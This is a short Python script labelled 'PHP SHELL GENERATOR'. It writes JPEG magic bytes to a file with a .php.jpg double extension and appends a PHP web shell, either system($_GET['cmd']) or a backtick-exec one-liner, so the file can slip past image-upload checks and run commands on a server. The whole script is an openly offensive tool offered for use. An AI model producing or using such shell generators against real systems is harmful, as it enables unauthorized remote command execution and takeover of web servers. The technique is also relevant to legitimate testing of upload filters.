#!/usr/bin/python3
#created by 4rings(cybermascato)

import os
import sys

jpg = 'FFD8FFDB'
payload1 = '<?php system($_GET[''cmd'']);?>'
payload2 = '<?=`$_GET[0]`?>'


def clean():
    os.system("clear")

    
def banner():
    print("-------------------")
    print("PHP SHELL GENERATOR")
    print("-------------------")

    
def selectorshell():
    print("[* 1] <?php system($_GET['cmd']);?>")
    print("[* 2] <?=`$_GET[0]`?>")
    

def generation1():
    os.system(f"echo '{jpg}' | xxd -r -p > generation1.php.jpg ")
    os.system(f"echo '{payload1}' >> generation1.php.jpg ")
    
    
def generation2():
    os.system(f"echo '{jpg}' | xxd -r -p > generation2.php.jpg ")
    os.system(f"echo '{payload2}' >> generation2.php.jpg ")    

#start
clean()
banner()
selectorshell()
selection = input("\n Selection: ")
if selection == '1':
    generation1()
elif selection == '2':
    generation2()
clean()
print("Completed \n \n Exiting...")







